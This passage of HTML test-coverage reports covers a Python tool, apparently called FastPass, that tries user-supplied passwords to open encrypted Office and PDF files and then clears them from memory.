    <p class="mis show_mis"><span class="n"><a id="t70" href="#t70">70</a></span><span class="t">            <span class="key">if</span> <span class="nam">file_name</span> <span class="key">in</span> <span class="nam">self</span><span class="op">.</span><span class="nam">stdin_mapping</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t71" href="#t71">71</a></span><span class="t">                <span class="nam">candidates</span><span class="op">.</span><span class="nam">append</span><span class="op">(</span><span class="nam">self</span><span class="op">.</span><span class="nam">stdin_mapping</span><span class="op">[</span><span class="nam">file_name</span><span class="op">]</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t72" href="#t72">72</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t73" href="#t73">73</a></span><span class="t">        <span class="com"># C4b: Add Command-Line Passwords First</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t74" href="#t74">74</a></span><span class="t">        <span class="com"># Put passwords user typed in command first</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t75" href="#t75">75</a></span><span class="t">        <span class="nam">candidates</span><span class="op">.</span><span class="nam">extend</span><span class="op">(</span><span class="nam">self</span><span class="op">.</span><span class="nam">cli_passwords</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t76" href="#t76">76</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t77" href="#t77">77</a></span><span class="t">        <span class="com"># C4c: Add File Passwords Second</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t78" href="#t78">78</a></span><span class="t">        <span class="com"># Add passwords from password file after command-line ones</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t79" href="#t79">79</a></span><span class="t">        <span class="nam">candidates</span><span class="op">.</span><span class="nam">extend</span><span class="op">(</span><span class="nam">self</span><span class="op">.</span><span class="nam">password_list</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t80" href="#t80">80</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t81" href="#t81">81</a></span><span class="t">        <span class="com"># C4d: Remove Duplicate Passwords</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t82" href="#t82">82</a></span><span class="t">        <span class="com"># Eliminate passwords that appear multiple times</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t83" href="#t83">83</a></span><span class="t">        <span class="nam">seen</span> <span class="op">=</span> <span class="nam">set</span><span class="op">(</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t84" href="#t84">84</a></span><span class="t">        <span class="nam">unique_candidates</span> <span class="op">=</span> <span class="op">[</span><span class="op">]</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t85" href="#t85">85</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t86" href="#t86">86</a></span><span class="t">        <span class="com"># C4d_Loop: Check Each Password for Duplicates</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t87" href="#t87">87</a></span><span class="t">        <span class="key">for</span> <span class="nam">password</span> <span class="key">in</span> <span class="nam">candidates</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t88" href="#t88">88</a></span><span class="t">            <span class="key">if</span> <span class="nam">password</span> <span class="key">not</span> <span class="key">in</span> <span class="nam">seen</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t89" href="#t89">89</a></span><span class="t">                <span class="com"># C4d_Add: Add New Password to List</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t90" href="#t90">90</a></span><span class="t">                <span class="nam">seen</span><span class="op">.</span><span class="nam">add</span><span class="op">(</span><span class="nam">password</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t91" href="#t91">91</a></span><span class="t">                <span class="nam">unique_candidates</span><span class="op">.</span><span class="nam">append</span><span class="op">(</span><span class="nam">password</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t92" href="#t92">92</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t93" href="#t93">93</a></span><span class="t">        <span class="com"># C4e: Finalize Password List</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t94" href="#t94">94</a></span><span class="t">        <span class="key">return</span> <span class="nam">unique_candidates</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t95" href="#t95">95</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t96" href="#t96">96</a></span><span class="t">    <span class="key">def</span> <span class="nam">find_working_password</span><span class="op">(</span><span class="nam">self</span><span class="op">,</span> <span class="nam">file_path</span><span class="op">:</span> <span class="nam">Path</span><span class="op">,</span> <span class="nam">crypto_handler</span><span class="op">)</span> <span class="op">-></span> <span class="nam">Optional</span><span class="op">[</span><span class="nam">str</span><span class="op">]</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t97" href="#t97">97</a></span><span class="t">        <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t98" href="#t98">98</a></span><span class="t"><span class="str">        C5a-C5d: Find working password for file by trying all candidates</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t99" href="#t99">99</a></span><span class="t"><span class="str">        Password testing mechanism</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t100" href="#t100">100</a></span><span class="t"><span class="str">        """</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t101" href="#t101">101</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t102" href="#t102">102</a></span><span class="t">        <span class="com"># C5a-C5b: Set Up Password Testing System and get passwords</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t103" href="#t103">103</a></span><span class="t">        <span class="nam">candidates</span> <span class="op">=</span> <span class="nam">self</span><span class="op">.</span><span class="nam">get_password_candidates</span><span class="op">(</span><span class="nam">file_path</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t104" href="#t104">104</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t105" href="#t105">105</a></span><span class="t">        <span class="key">if</span> <span class="key">not</span> <span class="nam">candidates</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t106" href="#t106">106</a></span><span class="t">            <span class="key">return</span> <span class="key">None</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t107" href="#t107">107</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t108" href="#t108">108</a></span><span class="t">        <span class="com"># C5c-C5d: Begin Trying Passwords</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t109" href="#t109">109</a></span><span class="t">        <span class="key">for</span> <span class="nam">password</span> <span class="key">in</span> <span class="nam">candidates</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t110" href="#t110">110</a></span><span class="t">            <span class="key">try</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t111" href="#t111">111</a></span><span class="t">                <span class="com"># C5d: Try Current Password</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t112" href="#t112">112</a></span><span class="t">                <span class="key">if</span> <span class="nam">crypto_handler</span><span class="op">.</span><span class="nam">test_password</span><span class="op">(</span><span class="nam">file_path</span><span class="op">,</span> <span class="nam">password</span><span class="op">)</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t113" href="#t113">113</a></span><span class="t">                    <span class="com"># C5d_Success: Found Working Password</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t114" href="#t114">114</a></span><span class="t">                    <span class="key">return</span> <span class="nam">password</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t115" href="#t115">115</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t116" href="#t116">116</a></span><span class="t">            <span class="key">except</span> <span class="nam">Exception</span> <span class="key">as</span> <span class="nam">e</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t117" href="#t117">117</a></span><span class="t">                <span class="com"># Continue trying other passwords</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t118" href="#t118">118</a></span><span class="t">                <span class="key">continue</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t119" href="#t119">119</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t120" href="#t120">120</a></span><span class="t">        <span class="com"># C5d_Failed: No Password Works</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t121" href="#t121">121</a></span><span class="t">        <span class="key">return</span> <span class="key">None</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t122" href="#t122">122</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t123" href="#t123">123</a></span><span class="t">    <span class="key">def</span> <span class="nam">clear_passwords</span><span class="op">(</span><span class="nam">self</span><span class="op">)</span> <span class="op">-></span> <span class="key">None</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t124" href="#t124">124</a></span><span class="t">        <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t125" href="#t125">125</a></span><span class="t"><span class="str">        E3a-E3d: Clear passwords from memory for security</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t126" href="#t126">126</a></span><span class="t"><span class="str">        Overwrite password memory</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t127" href="#t127">127</a></span><span class="t"><span class="str">        """</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t128" href="#t128">128</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t129" href="#t129">129</a></span><span class="t">        <span class="com"># E3a_Loop: Overwrite Password Memory</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t130" href="#t130">130</a></span><span class="t">        <span class="key">if</span> <span class="nam">self</span><span class="op">.</span><span class="nam">cli_passwords</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t131" href="#t131">131</a></span><span class="t">            <span class="key">for</span> <span class="nam">i</span> <span class="key">in</span> <span class="nam">range</span><span class="op">(</span><span class="nam">len</span><span class="op">(</span><span class="nam">self</span><span class="op">.</span><span class="nam">cli_passwords</span><span class="op">)</span><span class="op">)</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t132" href="#t132">132</a></span><span class="t">                <span class="key">if</span> <span class="nam">self</span><span class="op">.</span><span class="nam">cli_passwords</span><span class="op">[</span><span class="nam">i</span><span class="op">]</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t133" href="#t133">133</a></span><span class="t">                    <span class="com"># E3a_Overwrite: Overwrite Password</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t134" href="#t134">134</a></span><span class="t">                    <span class="nam">self</span><span class="op">.</span><span class="nam">cli_passwords</span><span class="op">[</span><span class="nam">i</span><span class="op">]</span> <span class="op">=</span> <span class="str">'X'</span> <span class="op">*</span> <span class="nam">len</span><span class="op">(</span><span class="nam">self</span><span class="op">.</span><span class="nam">cli_passwords</span><span class="op">[</span><span class="nam">i</span><span class="op">]</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t135" href="#t135">135</a></span><span class="t">            <span class="nam">self</span><span class="op">.</span><span class="nam">cli_passwords</span><span class="op">.</span><span class="nam">clear</span><span class="op">(</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t136" href="#t136">136</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t137" href="#t137">137</a></span><span class="t">        <span class="key">if</span> <span class="nam">self</span><span class="op">.</span><span class="nam">password_list</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t138" href="#t138">138</a></span><span class="t">            <span class="key">for</span> <span class="nam">i</span> <span class="key">in</span> <span class="nam">range</span><span class="op">(</span><span class="nam">len</span><span class="op">(</span><span class="nam">self</span><span class="op">.</span><span class="nam">password_list</span><span class="op">)</span><span class="op">)</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t139" href="#t139">139</a></span><span class="t">                <span class="key">if</span> <span class="nam">self</span><span class="op">.</span><span class="nam">password_list</span><span class="op">[</span><span class="nam">i</span><span class="op">]</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t140" href="#t140">140</a></span><span class="t">                    <span class="nam">self</span><span class="op">.</span><span class="nam">password_list</span><span class="op">[</span><span class="nam">i</span><span class="op">]</span> <span class="op">=</span> <span class="str">'X'</span> <span class="op">*</span> <span class="nam">len</span><span class="op">(</span><span class="nam">self</span><span class="op">.</span><span class="nam">password_list</span><span class="op">[</span><span class="nam">i</span><span class="op">]</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t141" href="#t141">141</a></span><span class="t">            <span class="nam">self</span><span class="op">.</span><span class="nam">password_list</span><span class="op">.</span><span class="nam">clear</span><span class="op">(</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t142" href="#t142">142</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t143" href="#t143">143</a></span><span class="t">        <span class="key">if</span> <span class="nam">self</span><span class="op">.</span><span class="nam">stdin_mapping</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t144" href="#t144">144</a></span><span class="t">            <span class="key">for</span> <span class="nam">key</span> <span class="key">in</span> <span class="nam">self</span><span class="op">.</span><span class="nam">stdin_mapping</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t145" href="#t145">145</a></span><span class="t">                <span class="key">if</span> <span class="nam">self</span><span class="op">.</span><span class="nam">stdin_mapping</span><span class="op">[</span><span class="nam">key</span><span class="op">]</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t146" href="#t146">146</a></span><span class="t">                    <span class="nam">self</span><span class="op">.</span><span class="nam">stdin_mapping</span><span class="op">[</span><span class="nam">key</span><span class="op">]</span> <span class="op">=</span> <span class="str">'X'</span> <span class="op">*</span> <span class="nam">len</span><span class="op">(</span><span class="nam">self</span><span class="op">.</span><span class="nam">stdin_mapping</span><span class="op">[</span><span class="nam">key</span><span class="op">]</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t147" href="#t147">147</a></span><span class="t">            <span class="nam">self</span><span class="op">.</span><span class="nam">stdin_mapping</span><span class="op">.</span><span class="nam">clear</span><span class="op">(</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t148" href="#t148">148</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t149" href="#t149">149</a></span><span class="t">        <span class="com"># E3c: Force Garbage Collection</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t150" href="#t150">150</a></span><span class="t">        <span class="key">import</span> <span class="nam">gc</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t151" href="#t151">151</a></span><span class="t">        <span class="nam">gc</span><span class="op">.</span><span class="nam">collect</span><span class="op">(</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
</main>
<footer>
    <div class="content">
        <p>
            <a class="nav" href="z_9d0a8317fb892e58___init___py.html">&#xab; prev</a> &nbsp; &nbsp;
            <a class="nav" href="index.html">&Hat; index</a> &nbsp; &nbsp;
            <a class="nav" href="z_ce21df766c911d41_security_py.html">&#xbb; next</a>
            &nbsp; &nbsp; &nbsp;
            <a class="nav" href="https://coverage.readthedocs.io/en/7.10.0">coverage.py v7.10.0</a>,
            created at 2025-07-26 17:08 -0400
        </p>
    </div>
</footer>
</body>
</html>
</file>

<file path="reports/coverage/z_ae6ae744f2ec6f26___init___py.html">
<!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title>Coverage for src\core\crypto_handlers\__init__.py: 100%</title>
    <link rel="icon" sizes="32x32" href="favicon_32_cb_58284776.png">
    <link rel="stylesheet" href="style_cb_dca529e9.css" type="text/css">
    <script src="coverage_html_cb_497bf287.js" defer></script>
</head>
<body class="pyfile">
<header>
    <div class="content">
        <h1>
            <span class="text">Coverage for </span><b>src\core\crypto_handlers\__init__.py</b>:
            <span class="pc_cov">100%</span>
        </h1>
        <aside id="help_panel_wrapper">
            <input id="help_panel_state" type="checkbox">
            <label for="help_panel_state">
                <img id="keyboard_icon" src="keybd_closed_cb_ce680311.png" alt="Show/hide keyboard shortcuts">
            </label>
            <div id="help_panel">
                <p class="legend">Shortcuts on this page</p>
                <div class="keyhelp">
                    <p>
                        <kbd>r</kbd>
                        <kbd>m</kbd>
                        <kbd>x</kbd>
                        &nbsp; toggle line displays
                    </p>
                    <p>
                        <kbd>j</kbd>
                        <kbd>k</kbd>
                        &nbsp; next/prev highlighted chunk
                    </p>
                    <p>
                        <kbd>0</kbd> &nbsp; (zero) top of page
                    </p>
                    <p>
                        <kbd>1</kbd> &nbsp; (one) first highlighted chunk
                    </p>
                    <p>
                        <kbd>[</kbd>
                        <kbd>]</kbd>
                        &nbsp; prev/next file
                    </p>
                    <p>
                        <kbd>u</kbd> &nbsp; up to the index
                    </p>
                    <p>
                        <kbd>?</kbd> &nbsp; show/hide this help
                    </p>
                </div>
            </div>
        </aside>
        <h2>
            <span class="text">3 statements &nbsp;</span>
            <button type="button" class="run button_toggle_run" value="run" data-shortcut="r" title="Toggle lines run">3<span class="text"> run</span></button>
            <button type="button" class="mis show_mis button_toggle_mis" value="mis" data-shortcut="m" title="Toggle lines missing">0<span class="text"> missing</span></button>
            <button type="button" class="exc show_exc button_toggle_exc" value="exc" data-shortcut="x" title="Toggle lines excluded">0<span class="text"> excluded</span></button>
        </h2>
        <p class="text">
            <a id="prevFileLink" class="nav" href="z_ce21df766c911d41___init___py.html">&#xab; prev</a> &nbsp; &nbsp;
            <a id="indexLink" class="nav" href="index.html">&Hat; index</a> &nbsp; &nbsp;
            <a id="nextFileLink" class="nav" href="z_ae6ae744f2ec6f26_office_handler_py.html">&#xbb; next</a>
            &nbsp; &nbsp; &nbsp;
            <a class="nav" href="https://coverage.readthedocs.io/en/7.10.0">coverage.py v7.10.0</a>,
            created at 2025-07-26 17:08 -0400
        </p>
        <aside class="hidden">
            <button type="button" class="button_next_chunk" data-shortcut="j"></button>
            <button type="button" class="button_prev_chunk" data-shortcut="k"></button>
            <button type="button" class="button_top_of_page" data-shortcut="0"></button>
            <button type="button" class="button_first_chunk" data-shortcut="1"></button>
            <button type="button" class="button_prev_file" data-shortcut="["></button>
            <button type="button" class="button_next_file" data-shortcut="]"></button>
            <button type="button" class="button_to_index" data-shortcut="u"></button>
            <button type="button" class="button_show_hide_help" data-shortcut="?"></button>
        </aside>
    </div>
</header>
<main id="source">
    <p class="pln"><span class="n"><a id="t1" href="#t1">1</a></span><span class="t"><span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t2" href="#t2">2</a></span><span class="t"><span class="str">FastPass Crypto Tool Integrations</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t3" href="#t3">3</a></span><span class="t"><span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t4" href="#t4">4</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t5" href="#t5">5</a></span><span class="t"><span class="key">from</span> <span class="op">.</span><span class="nam">office_handler</span> <span class="key">import</span> <span class="nam">OfficeDocumentHandler</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t6" href="#t6">6</a></span><span class="t"><span class="key">from</span> <span class="op">.</span><span class="nam">pdf_handler</span> <span class="key">import</span> <span class="nam">PDFHandler</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t7" href="#t7">7</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t8" href="#t8">8</a></span><span class="t"><span class="nam">__all__</span> <span class="op">=</span> <span class="op">[</span><span class="str">'OfficeDocumentHandler'</span><span class="op">,</span> <span class="str">'PDFHandler'</span><span class="op">]</span>&nbsp;</span><span class="r"></span></p>
</main>
<footer>
    <div class="content">
        <p>
            <a class="nav" href="z_ce21df766c911d41___init___py.html">&#xab; prev</a> &nbsp; &nbsp;
            <a class="nav" href="index.html">&Hat; index</a> &nbsp; &nbsp;
            <a class="nav" href="z_ae6ae744f2ec6f26_office_handler_py.html">&#xbb; next</a>
            &nbsp; &nbsp; &nbsp;
            <a class="nav" href="https://coverage.readthedocs.io/en/7.10.0">coverage.py v7.10.0</a>,
            created at 2025-07-26 17:08 -0400
        </p>
    </div>
</footer>
</body>
</html>
</file>

<file path="reports/coverage/z_ae6ae744f2ec6f26_office_handler_py.html">
<!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title>Coverage for src\core\crypto_handlers\office_handler.py: 24%</title>
    <link rel="icon" sizes="32x32" href="favicon_32_cb_58284776.png">
    <link rel="stylesheet" href="style_cb_dca529e9.css" type="text/css">
    <script src="coverage_html_cb_497bf287.js" defer></script>
</head>
<body class="pyfile">
<header>
    <div class="content">
        <h1>
            <span class="text">Coverage for </span><b>src\core\crypto_handlers\office_handler.py</b>:
            <span class="pc_cov">24%</span>
        </h1>
        <aside id="help_panel_wrapper">
            <input id="help_panel_state" type="checkbox">
            <label for="help_panel_state">
                <img id="keyboard_icon" src="keybd_closed_cb_ce680311.png" alt="Show/hide keyboard shortcuts">
            </label>
            <div id="help_panel">
                <p class="legend">Shortcuts on this page</p>
                <div class="keyhelp">
                    <p>
                        <kbd>r</kbd>
                        <kbd>m</kbd>
                        <kbd>x</kbd>
                        &nbsp; toggle line displays
                    </p>
                    <p>
                        <kbd>j</kbd>
                        <kbd>k</kbd>
                        &nbsp; next/prev highlighted chunk
                    </p>
                    <p>
                        <kbd>0</kbd> &nbsp; (zero) top of page
                    </p>
                    <p>
                        <kbd>1</kbd> &nbsp; (one) first highlighted chunk
                    </p>
                    <p>
                        <kbd>[</kbd>
                        <kbd>]</kbd>
                        &nbsp; prev/next file
                    </p>
                    <p>
                        <kbd>u</kbd> &nbsp; up to the index
                    </p>
                    <p>
                        <kbd>?</kbd> &nbsp; show/hide this help
                    </p>
                </div>
            </div>
        </aside>
        <h2>
            <span class="text">58 statements &nbsp;</span>
            <button type="button" class="run button_toggle_run" value="run" data-shortcut="r" title="Toggle lines run">14<span class="text"> run</span></button>
            <button type="button" class="mis show_mis button_toggle_mis" value="mis" data-shortcut="m" title="Toggle lines missing">44<span class="text"> missing</span></button>
            <button type="button" class="exc show_exc button_toggle_exc" value="exc" data-shortcut="x" title="Toggle lines excluded">0<span class="text"> excluded</span></button>
        </h2>
        <p class="text">
            <a id="prevFileLink" class="nav" href="z_ae6ae744f2ec6f26___init___py.html">&#xab; prev</a> &nbsp; &nbsp;
            <a id="indexLink" class="nav" href="index.html">&Hat; index</a> &nbsp; &nbsp;
            <a id="nextFileLink" class="nav" href="z_ae6ae744f2ec6f26_pdf_handler_py.html">&#xbb; next</a>
            &nbsp; &nbsp; &nbsp;
            <a class="nav" href="https://coverage.readthedocs.io/en/7.10.0">coverage.py v7.10.0</a>,
            created at 2025-07-26 17:08 -0400
        </p>
        <aside class="hidden">
            <button type="button" class="button_next_chunk" data-shortcut="j"></button>
            <button type="button" class="button_prev_chunk" data-shortcut="k"></button>
            <button type="button" class="button_top_of_page" data-shortcut="0"></button>
            <button type="button" class="button_first_chunk" data-shortcut="1"></button>
            <button type="button" class="button_prev_file" data-shortcut="["></button>
            <button type="button" class="button_next_file" data-shortcut="]"></button>
            <button type="button" class="button_to_index" data-shortcut="u"></button>
            <button type="button" class="button_show_hide_help" data-shortcut="?"></button>
        </aside>
    </div>
</header>
<main id="source">
    <p class="pln"><span class="n"><a id="t1" href="#t1">1</a></span><span class="t"><span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t2" href="#t2">2</a></span><span class="t"><span class="str">FastPass Office Document Handler</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t3" href="#t3">3</a></span><span class="t"><span class="str">Maps to: C1c_Office, C2a_Config - msoffcrypto-tool integration</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t4" href="#t4">4</a></span><span class="t"><span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t5" href="#t5">5</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t6" href="#t6">6</a></span><span class="t"><span class="com"># A1a: Load System Tools</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t7" href="#t7">7</a></span><span class="t"><span class="key">import</span> <span class="nam">logging</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t8" href="#t8">8</a></span><span class="t"><span class="key">from</span> <span class="nam">pathlib</span> <span class="key">import</span> <span class="nam">Path</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t9" href="#t9">9</a></span><span class="t"><span class="key">from</span> <span class="nam">typing</span> <span class="key">import</span> <span class="nam">Dict</span><span class="op">,</span> <span class="nam">Any</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t10" href="#t10">10</a></span><span class="t"><span class="key">import</span> <span class="nam">tempfile</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t11" href="#t11">11</a></span><span class="t"><span class="key">import</span> <span class="nam">shutil</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t12" href="#t12">12</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t13" href="#t13">13</a></span><span class="t"><span class="key">try</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t14" href="#t14">14</a></span><span class="t">    <span class="key">import</span> <span class="nam">msoffcrypto</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t15" href="#t15">15</a></span><span class="t"><span class="key">except</span> <span class="nam">ImportError</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t16" href="#t16">16</a></span><span class="t">    <span class="nam">msoffcrypto</span> <span class="op">=</span> <span class="key">None</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t17" href="#t17">17</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t18" href="#t18">18</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t19" href="#t19">19</a></span><span class="t"><span class="key">class</span> <span class="nam">OfficeDocumentHandler</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t20" href="#t20">20</a></span><span class="t">    <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t21" href="#t21">21</a></span><span class="t"><span class="str">    Microsoft Office document encryption/decryption handler</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t22" href="#t22">22</a></span><span class="t"><span class="str">    Uses msoffcrypto-tool for crypto operations</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t23" href="#t23">23</a></span><span class="t"><span class="str">    """</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t24" href="#t24">24</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t25" href="#t25">25</a></span><span class="t">    <span class="key">def</span> <span class="nam">__init__</span><span class="op">(</span><span class="nam">self</span><span class="op">,</span> <span class="nam">logger</span><span class="op">:</span> <span class="nam">logging</span><span class="op">.</span><span class="nam">Logger</span><span class="op">)</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
